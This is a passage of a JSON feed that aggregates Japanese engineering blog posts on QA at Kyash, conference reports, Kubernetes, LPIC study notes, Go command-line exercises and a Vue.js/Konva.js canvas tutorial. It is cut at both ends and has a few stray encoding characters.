Directでは上記2つのツールを利用してテストを行っていますが、下記のようにまだ課題があります。よいサービスを提供するためにはまだまだテストが足りない!! という強い気持ちがあるので、これから改善していく所存です。Kyash DirectのQA ~これから編~はじめにここからの内容は筆者の野望であり、未着手の部分を多く含むため将来実現した時には全く違う形になっている可能性があります。予めご了承ください。サービスごとのテストサービスごとのテストというと、各関数に対してテストを記述するような一般的な\\"テスト\\"をイメージされるかと思いますが、今回のものは実際にアプリケーションの外から指令を受け取り、処理して結果を吐き出すまでの一連の流れをテストするものをイメージしています。プラットフォームとしてのテストこちらのテストはいわゆる\\"実機テスト\\"で、サンドボックス環境などにアプリケーション群をデプロイして、本番さながらの環境でテストすることを意味します。おわりにKyash Directというお金を扱うプロダクトの品質を保証するためにどんな作戦が考えうるのか、これからどうしていきたいかをまとめました。そんなKyashでは、一緒にカード決済のプラットフォームを実現してくれる仲間を募集中です。www.wantedly.com明日は@rela1470による「Kyashの社内システムを刷新した5ヶ月間」です。最後にこれを置いておきます。Let\'s Kyash!KyashのQRコード","link":"https://pranc1ngpegasus.hatenablog.com/entry/2019/12/05/083300?utm_source=feed","isoDate":"2019-12-04T23:33:00.000Z","dateMiliSeconds":1575502380000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Zero Scale Abstraction in Knative Serving - Part1","contentSnippet":"Serverless Days Tokyo 2019 の Zero Scale Abstraction in Knative Serving というセッションの内容を書き起こしたものです。スピーカー…","link":"https://qiita.com/toVersus/items/9fa635e9cf57643f8dd6","isoDate":"2019-10-23T13:20:58.000Z","dateMiliSeconds":1571836858000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"LPIC 102 チートシート","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数ロケールディレクトリ・ファイル文字コードIPアドレスのクラスプライベートアドレスポート変数envsetshellのオプションエ…","link":"https://qiita.com/kyohmizu/items/d5d6fedc527efa9f649c","isoDate":"2019-10-09T01:56:54.000Z","dateMiliSeconds":1570586214000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"LPIC 101チートシート","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数デバイスファイルファイルシステムディレクトリ・ファイルsystemdのユニットvi正規表現dpkg設定ファイル  /etc/dpkg/…","link":"https://qiita.com/kyohmizu/items/923844999018fd456d44","isoDate":"2019-10-09T01:48:33.000Z","dateMiliSeconds":1570585713000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"builderscon2019はスタッフ参加でもめちゃくちゃ学びがあった","contentSnippet":"毎年参加しているbuilderscionなんですが、今年はボランティアスタッフとして参加してきたので、そのレポートを書いてみたいと思います。スタッフ参加の動機ボランティアスタッフ参加の動機なんですが、実は最近、自身のモチベーションの低下に危機感を覚えたからでした。builderscon tokyo 2019 当日ボランティアスタッフ募集を開始します！ https://t.co/bhE6XJ0GyL— Builderscon (@builderscon) June 26, 2019また、最近は社内でゲームコミュニティを運営していて、外部向けにイベントを開催することもあるので大きめのカンファレンスでノウハウを吸収できそうと思ったところもありました。スタッフからの学び初めて大きなカンファレンスのスタッフをやってみていろいろな気づきや学びがありました。顔合わせスタッフ申込後、本番1ヶ月前にスタッフミーティングと称した顔合わせの機会がありました。機材大きなカンファレンスでは配信機材どうやってるんだろう？という興味があったのですが、今回はセッション部屋担当になったということもありじっくり拝見させていただきました。機材の詳細についてはblog書こうかな〜と長谷川さんがおっしゃってたので楽しみにまっておくことにします。簡単に説明すると、画面の入力は2系統PCビデオカメラ音声入力はミキサー登壇者だけではなく司会や質問者の声も録画に入るようになっていたハードウェアエンコーダのキャプチャボードを挟んでOBSで画面を作ってPC(入力)、ビデオカメラ、セッションのタイトルを合成セッション時の画面以外にも幕間のCMやセッション前の画面などが事前に準備されている場面に応じて出力を切り替えるという仕組みが構築されていました。コミュニケーション技術カンファレンスはとにかく楽しいというのを知っているので、せっかくスタッフやってるんだし1人でも多くの来場者にも楽しんでもらえるよう積極的にやろう！という思いでやったのでいろんな方に声をかけられたような気がします。Tipsとか細かい話必須系アイテム(自分用にあるとよいグッズ)サコッシュや小さなバッグモバイルバッテリーカッターナイフ養生テープとペンペットボトルをぶら下げられるやつがあると便利なんだかんだで力仕事や運搬系作業が多いので軍手は必要スタッフルームに高そうなお弁当が置いてあったらそれはスピーカーに用意されたものかもしれない(間違えて食べてしまった)余ってるからといってお弁当を食べすぎると後で痛い目をみるスタッフもエンジニアが多いからかすぐに作業を手順化、最適化をし始めるケチらずに宿泊したのは正解だった感想前夜祭から準備を初めて計3日。疲れはしましたがいちスタッフとして最高に楽しませてもらいました、ありがとうございました！ひとこと感想スタッフTシャツがおしゃれだったノベルティのストラップがおしゃのおしゃだった(常用してる)最後に私が関東に移り住んで初めて参加したカンファレンス、YAPC::Asia Tokyo 2014からちょうど5年。何らかの形でこれからも関わっていきたいと思っているのでまたどこかでお会いしましょう！最後につね様とのいつものツーショットでお別れしたいと思います。それではごきげんよう！いつものツーショット pic.twitter.com/hpCdaGDZGv— jigyakkuma (@jigyakkuma_) August 30, 2019(こちらはNature Inc. CTOのSongmuさんに撮っていただいた1枚)","link":"https://blog.jigyakkuma.org/2019/09/02/builderscon2019/","isoDate":"2019-09-02T00:18:22.000Z","dateMiliSeconds":1567383502000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"de:code 2019 参加レポート","contentSnippet":"Microsoft主催のテクニカルカンファレンス「de:code 2019」に参加してきました。www.microsoft.com参加セッション1日目コンテナ技術を中心にセッションを選択【KN01】基調講演【CD06】しくみがわかる Azure Kubernetes Service (AKS) ～開発者目線で Kubernetes の基本を理解する～【CD01】Windows Containers と Azure による、既存 .NET アプリケーションのモダナイゼーション【CD91】HashiCorp Terraform Azure Provider チュートリアル【CD12】マネージド Kubernetes ガチ本番運用 in ZOZOTOWNwww.youtube.com2日目コンテナ・セキュリティのセッションを選択【SE07】脆弱性はなぜ生まれ、どのように攻撃されるのか? 安全なアプリを開発、運用するためのきほん【CD93】コンテナ環境の永続化ストレージ問題を NetApp Kubernetes Service と Azure NetApp Files でさらっと解決【CM12】.NET Core マルチ プラットフォームの本質【SE05】もうセキュリティはやりたくない!! 第 3 弾 ～Azure Sentinel Deep Dive～注目技術参加したセッションの中で、特に印象に残った or 関心のある技術を取り上げます。Azure Kubernetes Service(AKS)Azureのマネージド Kubernetes サービスである AKS ですが、導入事例が増えてきているそうです。ノロジーズをはじめ、いくつかの企業が自社の導入について講演していました。Kubernetes に概要や操作に関しては特筆することはありませんでしたが、Azure関連の技術として以下に興味を持ちました。Kubernetes-based Event-driven Autoscaling(KEDA)Microsoft と Red Hatが共同作成したプロジェクト。イベント駆動でコンテナのオートスケールを実現します。GitHub - kedacore/keda: KEDA is a Kubernetes-based Event Driven Autoscaling component. It provides event driven scale for any container running in KubernetesVirtual Kubeletkubelet のように動作し、Kubernetes と他のAPIを接続する役割を果たすもの。VM と同じように Kubernetes クラスタで一元管理できます。GitHub - virtual-kubelet/virtual-kubelet: Virtual Kubelet is an open source Kubernetes kubelet implementation.Windows コンテナサポートWindows Server Node が、Kubernetes クラスタで Linux Node と同時に管理できるようになりました。AKS では Multiple Node Pool を使用することで Windows Server Node を作成できます。チュートリアルを試しましたが、なぜかクラスタ作成に失敗)Windows containers now supported in Kubernetes - Open Source blogAzure NetApp FilesNetApp 社の高速ストレージサービス。SSD 並みの速度が出るそうで、Kubernetes の永続化ボリュームとして有用だと思います。また NetApp Kubernetes Service という Kubernetes 管理サービスも提供しているようです。(Rancher みたいなもの？)Azure NetApp Files documentation | Microsoft DocsAzure SentinelAI を使用した高機能なセキュリティサービス。Azure Sentinel | Microsoft Azureその他Azure DevOpsAzure PiplineApp ServiceService FabricWSL2感想Azureに関連したテーマのセッションがほとんどでした。クラウドサービスは以前に比べ使いやすくなっていて、機能も充実してきた印象です。AKS、AzureADの動向は今後も注目していこうと思います。LT資料社内勉強会で de:code の recap を発表しました。    Recap of de code 2019  from Kyohei Mizumoto www.slideshare.netおまけ2日間のお昼のお弁当です。1日目2日目","link":"https://kyohmizu.hatenablog.com/entry/2019/06/06/111805","isoDate":"2019-06-06T02:18:05.000Z","dateMiliSeconds":1559787485000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kubernetesリンク集","contentSnippet":"Kubernetes関連の役立つリンクを記載します。公式リファレンスReference - KubernetesKubectl Reference DocsPhippy and Friends - Cloud Native Computing FoundationGitHubGitHub - kubernetes/kubernetes: Production-Grade Container Scheduling and ManagementGitHub - kelseyhightower/kubernetes-the-hard-way: Bootstrap Kubernetes the hard way on Google Cloud Platform. No scripts.GitHub - jamiehannaford/what-happens-when-k8s: \uD83E\uDD14 What happens when I type kubectl run?プロダクトGoogle Kubernetes Engine documentation \xa0|\xa0 Kubernetes Engine \xa0|\xa0 Google CloudAzure Kubernetes Service (AKS) Documentation - Tutorials, API Reference | Microsoft DocsWhat Is Amazon EKS? - Amazon EKSDocumentation | Rancher LabsK3s: Kightweight KubernetesPivotal Container Service (PKS) | Pivotalスライド、ブログ等Kubernetes のソースコードとの付き合い方 #gounco / Kubernetes source code reading - Speaker DeckKubernetes Patterns : Capacity PlanningKubeWeekly - QiitaKubernetesのユーザー管理と認証・権限確認機構を理解しよう | さくらのナレッジ書籍Kubernetes完全ガイド - インプレスブックス","link":"https://kyohmizu.hatenablog.com/entry/2019/05/28/115504","isoDate":"2019-05-28T02:55:04.000Z","dateMiliSeconds":1559012104000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【20日チャレンジ】LinuxコマンドをGoで実装","contentSnippet":"Go言語の学習のため、LinuxコマンドをGoで実装します。\\r目的\\r\\rGo言語に慣れる\\r標準パッケージの機能、使い方を知る\\r\\rルール\\r以下のルールでチャレンジを行います。\\r\\r1日1コマンドを実装する\\r最低限、コマンドの基本的な動作(オプションなしの実行など)を行えるようにする\\r余裕があれば追加機能を実装する\\rコマンド名は\\"my\\" + \\"Linuxコマンド名\\"とする\\r極力標準パッケージを使用する\\r\\rソースコード\\rソースコードはGithubで管理します。\\rhttps://github.com/kyohmizu/go-cli-tools\\rスケジュール\\r\\r\\r\\rNo\\r日付\\rコマンド\\r基本実装\\rオプション\\r学習内容\\r\\r\\r1\\r5/23\\rmyls\\r〇\\r\xa0\\r\\rディレクトリ操作\\rエラー処理\xa0\\r\\r\\r\\r2\\r5/24\\rmycp\\r〇\\r△\\rファイル操作\\r\\r\\r3\\r5/25\\rmymv\\r〇\\r△\\r\xa0\\r\\r\\r4\\r5/26\\rmyrm\\r〇\\r△\\r\xa0\\r\\r\\r5\\r5/27\\rmycat\\r〇\\r△\\r\xa0\\r\\r\\r6\\r5/28\\rmycurl\\r〇\\r△\\r\\rhttp接続の実装\\rオプションの複数回指定\\r\\r\\r\\r7\\r5/29\\rmypwd\\r〇\\r△\\r\xa0OSによる条件分岐\\r\\r\\r8\\r5/30\\rmytouch\\r〇\\r△\\rbuild tagの設定\xa0\\r\\r\\r9\\r5/31\\rmymkdir\\r〇\\r△\\r\xa0ファイルの操作権限\\r\\r\\r10\\r6/1\\rmykill\\r〇\\r〇\\rプロセスとシグナル\xa0\\r\\r\\r11\\r6/2\\rmyecho\\r〇\\r-\\r引数の取得\\r\\r\\r12\\r6/3\\rmytime\\r△\\r-\\r\\rコマンド実行\\rtimeの操作\\r\\r\\r\\r13\\r6/4\\rmychmod\\r△\\r-\\r\\rbit演算\\rファイルの権限\\r\\r\\r\\r14\\r6/5\\rmyyes\\r〇\\r〇\\r\xa0\\r\\r\\r15\\r6/6\\rmyenv\\r〇\\r△\\r\\rwindowsで確認不可\\r\\r\\r\\r16\\r6/7\\rmychown\\r〇\\r△\\r\\ruser,group操作\\rwindowsで確認不可\\r\\r\\r\\r17\\r6/8\\rmygrep\\r〇\\r△\\r\\rgrepの操作\\rgoの正規表現\\r\\r\\r\\r18\\r6/9\\rmysleep\\r〇\\r△\\r\xa0\\r\\r\\r19\\r6/10\\rmymkdir\\r〇\\r△\\r\xa0\\r\\r\\r20\\r6/11\\rmyln\\r〇\\r△\\rリンクの操作\\r\\r\\r\\r\xa0\\r成果\\r\\rGoの構文や記法に慣れてきた\\rGo標準パッケージの使い方、調べ方を覚えた\\rLinuxコマンドの動作を知ることができた\xa0\\r\\r感想\\r20日も書けば、ある程度書けるようになることがわかりました。\\r普段使用するC#とGoが似ている点も覚えやすかったのだと思います。\\r次はGoでAPIを作成してみようと考えています。","link":"https://kyohmizu.hatenablog.com/entry/2019/05/23/172119","isoDate":"2019-05-23T08:21:19.000Z","dateMiliSeconds":1558599679000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Istioが作るサービスメッシュ~サンプルアプリのデプロイ~","contentSnippet":"サンプルアプリ題材: BookInfo アプリケーション※ 事前にIstioをKubernetesにデプロイしておいてください．構成サンプルアプリのデプロイistio-1.0.6 dire…","link":"https://qiita.com/tozastation/items/1f3c3f213b42e1689406","isoDate":"2019-03-14T05:18:21.000Z","dateMiliSeconds":1552540701000,"authorName":"tozastation","authorId":"tozastation"},{"title":"2018年振り返りと、2019年の目標","contentSnippet":"2018年5月末から、エンジニアリングに関する様々な活動を行ってきました。\\r1年の終わりにそれらの活動をまとめ、2019年の目標を記したいと思います。\\r\\r2018年の活動\\r2018年は積極的に新しい技術へチャレンジし、勉強会を通して素晴らしい方々に出会うことができました。\\r新たに触れた技術・ツール\\r\\rGitHub\\rNode.js\\rAngular\\rGolang\\rCentOS\\rDocker\\rKubernetes\\rAzure\\rGCP\\rOWASP ZAP\\rLINE BOT/Clova\\rAgile\\rペアプログラミング/モブプログラミング\\r\\r勉強会・カンファレンス\\r\\rLINE Developer Meetup\\rde:code 2018\\rAzureもくもく会\\rng-japan 2018\\rSQL Server 2017勉強会\\rInteract 2018\\rCCSE 2018\\rThink Japan IBM Code Day\\rJXUG Xamarinハンズオン\\rCosmos DBハンズオン\\rくじらや Dockerハンズオン\\rLINE Clovaスキル開発ハンズオン\\rLINE BOOT AWARDS 2018 ハッカソン\\rGDG DevFest Tokyo 2018\\rXP祭り\\rAzureML勉強会\\rBIT VALLEY 2018\\r.NET Conf 2018\\rContainer SIG Meet-up\\rテスト管理を語る夕べ\\rAVTOKYO\\rアジャイル相談室\\rOSSセキュリティ技術の会\\rJapan Container Days\\r\\r※Japan Container Daysはスタッフとして参加させてもらいました。\\r書籍\\r読了\\r\\r徹底攻略 データベーススペシャリスト教科書\\r徹底攻略 ネットワークスペシャリスト教科書\\rショートコードプログラミング 第3版\\r新装版 達人プログラマー\\rSQLアンチパターン\\rインフラエンジニアの教科書2\\rプログラマのためのDocker教科書 第2版\\rDocker/Kubernetes 実践コンテナ開発入門\\r\\r読みかけ\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\r\\r社内の活動\\r\\r技術交流、コミュニケーション促進のためチャンネルを開設\\r社内勉強会を主催\\rモブプログラミング・ペアプログラミングを開始\\r\\r資格\\r合格\\r\\rデータベーススペシャリスト\\r\\r不合格\\r\\rネットワークスペシャリスト\\r\\r午後Ⅰが1点足りず…\\rその他\\r\\rはてなブログを開設\\rQiitaアドベントカレンダーに参加\\r\\r2019年の目標\\r7ヶ月間の活動の中で、様々な技術分野にチャレンジした結果、インフラ・セキュリティへの関心が強いことがわかりました。\\r2019年はContainerを中心にインフラのスキルを身に着け、セキュリティ分野の知見を広めていきます。\\r書籍\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\rKubernetes完全ガイド\\rハッカーの学校\\rテスト駆動開発\\r徹底マスター JavaScriptの教科書\\rドメイン駆動設計\\rハッキング・ラボのつくりかた\\r\\r資格\\r\\rLPIC Level1\\r情報処理安全確保支援士\\rネットワークスペシャリスト","link":"https://kyohmizu.hatenablog.com/entry/2018/12/31/231740","isoDate":"2018-12-31T14:17:40.000Z","dateMiliSeconds":1546265860000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"モバイルファクトリーのインフラアーキテクチャというアドベントカレンダー書いてました","contentSnippet":"ちょっと過去の話ですが、会社の技術ブログで書いてました。tech.mobilefactory.jp","link":"https://blog.masasuzu.net/entry/2018/12/22/000000","isoDate":"2018-12-21T15:00:00.000Z","dateMiliSeconds":1545404400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"kubernetesにあるIngress Controller�の一覧を挙げてみる","contentSnippet":"はじめにIngress ControllerはL7 Load Balancerの機能を果たすものであり、Ingressリソースはそのルールを定義したものです。このIngress Controlle…","link":"https://qiita.com/skikkh/items/c59de1f5e188d0bbeb35","isoDate":"2018-12-17T14:21:33.000Z","dateMiliSeconds":1545056493000,"authorName":"skikkh","authorId":"skikkh"},{"title":"日本語でvimのfを使う","contentSnippet":"fvimではf, F, t, Tを使うことで、瞬時に目的の文字上にカーソルを移動することができます。動作faでカーソルから右側の方向の１番近い「a」の位置に移動することができます。3faでカ…","link":"https://qiita.com/atsuya0/items/d90bb3f4b8e538c028a9","isoDate":"2018-12-04T06:03:39.000Z","dateMiliSeconds":1543903419000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[Docker] awslogs-datetime-format の指定方法に注意","contentSnippet":"[Docker] awslogs-datetime-format の指定方法に注意背景Dockerの awslogs ログドライバでは，awslogs-datetime-format オプション…","link":"https://qiita.com/toshikish/items/59a3a4426930e29f0673","isoDate":"2018-11-07T03:23:50.000Z","dateMiliSeconds":1541561030000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Vue.jsとKonva.jsでcanvasに入門した","contentSnippet":"これはなにVue.jsとVue.jsに対応したCanvasラッパーであるKonva.jsを使ってCanvasに入門した話をまとめる。つかった技術Vue.jsKonva.js (vue-konvaパッケージ)なにをつくった時間とともに七色に変化する円をつくった。右側に表示されている16進数は2桁ずつのRGB値となっており、七色に変化させたかったのでHSB色空間からRGB色空間に変換したものを使っている。つくり方1. Vue.jsプロジェクトを作成するVue CLI 3を使ってプロジェクトを作成した。プリセットをデフォルト(babel, eslint)、パッケージ管理ツールをyarnとした。2. vue-konvaパッケージをインストールするVue.jsに対応したCanvasラッパー\xe3Konva.jsしか見つからなかったので、vue-konvaパッケージをインストールする。yarn add vue-konva konva3. 不要なコンポーネントのお掃除をする入門なので、余計な記述があると混乱するため不要な記述は削除しておく。また、src/components/HelloWorld.vueも不要なので削除する。<template>  <div>  </div></template><script>export default {  name: \'app\',  components: {  }}</script>4. コンポーネントを作成して円を描くsrc/componentsディレクトリに適当な名前でvueファイルを作成し、以下のコードを記述する。<template>  <v-stage :config=\\"configKonva\\">    <v-layer>      <v-circle :config=\\"configCircle\\"></v-circle>    </v-layer>  </v-stage></template><script>const width = window.innerWidth;const height = window.innerHeight;export default {  data() {    return {      configKonva: {        width: width,        height: height      },      configCircle: {        x: 200,        y: 200,        radius: 100,        fill: \\"#00c800\\",        stroke: \\"black\\",        strokeWidth: 4,        shadowBlur: 10      }    };  }</script><template>  <div>    <Circle />  </div></template><script>import Circle from \'./components/Circle.vue\'export default {  name: \'app\',  components: {    Circle  }}</script>この段階で以下のような円が描画されます。5. 円の色を変えるどこを変えたらいいのvue-konvaでは、v-stageディレクティブにconfigKonvaオブジェクトを渡すことでcanvasの設定を行い、v-circleディレクティブにconfigCircleというオブジェクトを渡すことで円を描画しているようでした。円の中の\xe8\xb2を変えるためには、configCircleオブジェクトのfillプロパティを変えるとよさそうです。configCircle: {  x: 200,  y: 200,  radius: 100,  fill: \\"#00c800\\",  stroke: \\"black\\",  strokeWidth: 4,  shadowBlur: 10}fillプロパティは#からはじまる6桁の16進数を指定することによりRGBの値を設定できるので、この値を上書きしていくことにします。HSBからRGBへの変換今回、16進6桁のRGB値を七色に変化させるためにHSB色空間というものを使ってみました。HSB色空間とは、色をH(Hue: 色相)、S(Saturation: 彩度)、B(Brightness: 明度)で表現する色空間のことです。今回は、彩度、明度を100%にした状態で、色相を0~360まで変化させることで七色に色が変化させることにしました。HSBからRGBへの変換\xe3参考に、変換するコードを実装したのがこちら。Hに0~360までの値、Sに0~1までの値、Vに0~1までの値を引数として与えることでRGBの値を16進2桁ずつの配列として返してくれます。hsv2rgb: function (H,S,V) {  var C = V * S;  var Hp = H / 60;  var X = C * (1 - Math.abs(Hp % 2 - 1));  var R, G, B;  if (0 <= Hp && Hp < 1) {    [R,G,B]=[C,X,0]  }  else if (1 <= Hp && Hp < 2) {    [R,G,B]=[X,C,0]  }  else if (2 <= Hp && Hp < 3) {    [R,G,B]=[0,C,X]  }  else if (3 <= Hp && Hp < 4) {    [R,G,B]=[0,X,C]  }  else if (4 <= Hp && Hp < 5) {    [R,G,B]=[X,0,C]  }  else if (5 <= Hp && Hp < 6) {    [R,G,B]=[C,0,X]  }  var m = V - C;  [R, G, B] = [R+m, G+m, B+m];  R = Math.floor(R * 255).toString(16);  G = Math.floor(G * 255).toString(16);  B = Math.floor(B * 255).toString(16);  return [R ,G, B];}実際に変えてみようRGBの値は16進6桁の文字列として与える必要があるため、zeroPadding関数を使ってhsv2rgb関数の最後にRGBそれぞれの値を0埋めするコードを追加した。zeroPadding: function (num, length) {  return (\'0000000000\' + num).slice(-length);},hsv2rgb: function (H,S,V) {  // ここまで省略  R = Math.floor(R * 255).toString(16);  G = Math.floor(G * 255).toString(16);  B = Math.floor(B * 255).toString(16);  R = this.zeroPadding(R, 2);  G = this.zeroPadding(G, 2);  B = this.zeroPadding(B, 2);  return [R ,G, B];}この2つの関数とsetIntervalを使って色を変化させてみます。var inthsv = 0;setInterval( () => {  inthsv++;  inthsv %= 360;  var strrgb = this.hsv2rgb(inthsv, 1, 1).join(\'\');  this.configCircle.fill = \'#\' + strrgb;  console.log(strrgb);}, 1/30 * 1000);6. 完成形のコード<template>  <v-stage :config=\\"configKonva\\">    <v-layer>      <v-circle :config=\\"configCircle\\"></v-circle>    </v-layer>  </v-stage></template><script>const width = window.innerWidth;const height = window.innerHeight;var inthsv = 0;export default {  data() {    return {      configKonva: {        width: width,        height: height      },      configCircle: {        x: 200,        y: 200,        radius: 100,        fill: \\"#00c800\\",        stroke: \\"black\\",        strokeWidth: 4,        shadowBlur: 10      }    };  },  mounted() {    setInterval( () => {      inthsv++;      inthsv %= 360;      var strrgb = this.hsv2rgb(inthsv, 1, 1).join(\'\');      this.configCircle.fill = \'#\' + strrgb;      console.log(strrgb);    }, 1/30 * 1000);  },  methods: {    zeroPadding: function (num, length) {      return (\'0000000000\' + num).slice(-length);    },    hsv2rgb: function (H,S,V) {      var C = V * S;      var Hp = H / 60;      var X = C * (1 - Math.abs(Hp % 2 - 1));      var R, G, B;      if (0 <= Hp && Hp < 1) {        [R,G,B]=[C,X,0]      }      else if (1 <= Hp && Hp < 2) {        [R,G,B]=[X,C,0]      }      else if (2 <= Hp && Hp < 3) {        [R,G,B]=[0,C,X]      }      else if (3 <= Hp && Hp < 4) {        [R,G,B]=[0,X,C]      }      else if (4 <= Hp && Hp < 5) {        [R,G,B]=[X,0,C]      }      else if (5 <= Hp && Hp < 6) {        [R,G,B]=[C,0,X]      }      var m = V - C;      [R, G, B] = [R+m, G+m, B+m];      R = Math.floor(R * 255).toString(16);      G = Math.floor(G * 255).toString(16);      B = Math.floor(B * 255).toString(16);      R = this.zeroPadding(R, 2);      G = this.zeroPadding(G, 2);      B = this.zeroPadding(B, 2);      return [R ,G, B];    }  }};</script><style>body {  margin: 0;  padding: 0;  overflow: hidden;  background-color: #F0F0F0;}</style>まとめVue.jsとKonva.jsを使ってcanvasに入門してみた。Konva.jsがわかりやすくラップしてくれていてサクっと描画することができて好印象だった。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2017/10/18/000000?utm_source=feed","isoDate":"2018-10-17T15:00:00.000Z","dateMiliSeconds":1539788400000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"ローカル環境でAnsibleの鍵交換がめんどくさい貴方に送るプラクティス","contentSnippet":"はじめに平成の時分も終わりに近づく中、野分立ち尽くす天災に人々は翻弄され、お家で過ごすのを余儀なくされる日が多いように思います。^1今日のような一日は、自然とQiitaにたどり着き、PVが増…","link":"https://qiita.com/skikkh/items/ca236c512d314691b35c","isoDate":"2018-09-30T09:33:37.000Z","dateMiliSeconds":1538300017000,"authorName":"skikkh","authorId":"skikkh"},{"title":"builderscon2018もやっぱり最高だった","contentSnippet":"いやー、今回のbuildersconも楽しかったですね〜！さっそくですが、今回のbuidlersconでもたくさんの刺激をいただけたので、その感想などをとりとめなく書き留めておきます。カンファレンスに思うこと今回のbuildersconについてあれこれ書く前に3年くらいこの手のカンファレンスに参加してきて感じていることについて少し。・ 失敗体験、そこから得た学び・ 苦悩したプロセス・ 検証における自分なりの答えみたいなのが特におもしろいと思っている。個人的によかったセッション前夜祭、本編含めどのセッションもとても楽しませていただきましたが、その中でも個人的によかったと思うものをいくつか紹介します。[知らなかった、時に困るWebサービスのセキュリティ対策]こちらはGMOペパボ株式会社 @tnmtさんのセッションです。siteslide何がよかったって、会社で起こった不正アクセスの情報漏えいについて誠実に内容を発表されてたことですよね。[つらくないマルチテナンシーを求めて: 全て見せます！ SmartHR データベース移行プロジェクトの裏側]こちらは株式会社SmartHR @purintaiさんのセッションです。siteslideSmartHRのエンジニアの方と話す機会があって、その時にもマルチテナントで苦労している、というお話を聞いたことがあってその全貌が聞けるというので楽しみにしていました。[なぜ私はキーボードを作るのか]こちらもGMOペパボ株式会社の方で@j_o_lantern0422さんのセッションです。siteslide私も自キ勢なのでセッションが楽しみと言うより他社の自キ勢の方と知り合えたのがよかったです。全体を通しての感想テーマの一つとして「ギーク達のお祭り」となっているので、やっぱり濃い内容のセッションが多くて、刺激と知見が得られるのは本当レベル高い。よかったことアフターパーティーでのことなんですが、懇親会でメンターとかマネジメントとか評価とかの他社の話が聞けて最高すぎたしそういうセッションを聞きたい人がビルコンに来る層にわりと居そうだなと思ったので何かバリューを出せるようにやっていくかーという決意表明— jigyakkuma (@jigyakkuma_) September 7, 2018ということがあって、@shiba_yu36さんと互いの会社において包み隠さず濃い意見交換できたのがめちゃくちゃありがたかったです。スタッフへのフィードバック牧さんがスタッフに対してもフィードバックほしい！と渇望されていたので書きます。強い人にベストトークの票が偏りがち問題は新人賞(初めてbuildersconで登壇した人の最多得票)みたいな枠でも設けたらいいのでは、というアイディアメインホール入口に受付があるのでどうしても混雑しがち(構造上しゃーないとも思う)ノベルティの水は置いてたら喉乾いた人が適当に飲むから常設しておいてほしかった(最後に無理やり渡すのはスポンサーにも失礼な感じがした)各部屋のキャパシティが限界を越えてて観たいセッションが見れないというのがいくつかあったので次はもう少し規模を大きくしてパシフィコとかでやるんだろうなーという期待個人的には前回あったオサレな朝食はよかったので今回なくなったのは寂しかった(諸事情でなくなったんだろうということで理解はしてる)とはいえ、全体を通してみたときの満足度や快適度はかなり高かったと思う(悪いところを拾い上げればキリがないし)こんな感じでしょうか。最後に最近、感情をなくして仕事をただただこなすマンになってて元気がなかったんですが、いろんな方とお話しさせていただいたりセッションを聞いてたくさん力をもらえたような気がします。こういったカンファレンスが開催できるコミュニティを今後も大事にしていくべきなんだろうなーと思い、これからも微力ながらサポーターとして応援します！","link":"https://blog.jigyakkuma.org/2018/09/08/builderscon2018/","isoDate":"2018-09-08T04:02:26.000Z","dateMiliSeconds":1536379346000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"新人が学ぶAnsibleもくもく会 ネットワーク編 報告会","contentSnippet":"はじめにお久しぶりのエントリになります。新卒でインフラエンジニアをしている小心者のひよこです。このような職種に身をおいてはや5ヶ月というところで、世の中を幅広く見渡してみると、どうやら世は大…","link":"https://qiita.com/skikkh/items/156c677e07ffc6b5b4ef","isoDate":"2018-08-29T14:34:09.000Z","dateMiliSeconds":1535553249000,"authorName":"skikkh","authorId":"skikkh"},{"title":"[Laravel] バリデーションデータに前処理したい","contentSnippet":"[Laravel] バリデーションデータに前処理したい当てはまるケースフォーム入力データとデータベース保存データの形式が違う．例えば…全角・半角変換先頭・末尾の空白を取り除くユーザーには0…","link":"https://qiita.com/toshikish/items/f38b691adbebd7ba7720","isoDate":"2018-06-12T09:27:45.000Z","dateMiliSeconds":1528795665000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Git リポジトリを分割する","contentSnippet":"以下のようなディレクトリ構造のリポジトリを分割する方法を場合分けしてまとめます。repo1/ ├─ subdir/ ├─ aaa ├─ bbb ├─ ccc └─ dddケース1：サブディレクト…","link":"https://qiita.com/toshikish/items/3529f75c511a65723798","isoDate":"2018-04-11T10:14:22.000Z","dateMiliSeconds":1523441662000,"authorName":"toshikish","authorId":"toshikish"},{"title":"ブログを GCS Hosting から GAE に移行して https 化","contentSnippet":"blogをhttpsにするといって幾星霜— jigyakkuma (@jigyakkuma_) March 4, 2018ということで重い腰を上げて取り掛かることにしました。腰が重かった理由がいくつかありまして、ブログはHUGOで generate してるので静的コンテンツが配信できればいいGCS が https 化してくれるのを待っていた静的コンテンツの配信に GAE はなーという想いなどがあって目をそむけ続けてましたが、https に切り替えないとダメだーというギリギリのタイミングでやるとろくなことがない気がしたのでやることにしました。GAE で SSL をマネージドしてくれるようになったのでそれを使うことにします。移行前の準備まずは GAE で動いているものがないので移行して動くことを確認できる環境を作ります。goappを使ってローカル環境で動作確認が行えるようCloud SDK for Goを入れておきます。goaap serveでローカルでサーバが立ち上がるので localhost:8080 でブラウザから確認できます。ひとつ注意点としては hugo 自体は build されないので、記事を書いてコンテンツの内容を確認するのであればhugo server -wを使うのがよいです。goapp はあくまでも GAE として動作するかの確認に使います。移行作業GAE への移行作業自体はこちらのブログでわかりやすく解説されているので参考にしました。secure: alwaysですが、SSL 証明書の適用は GCP のコンソールより GAE →設定を開いてカスタムドメインの追加をしておく必要があります。デプロイデプロイは今までどおり 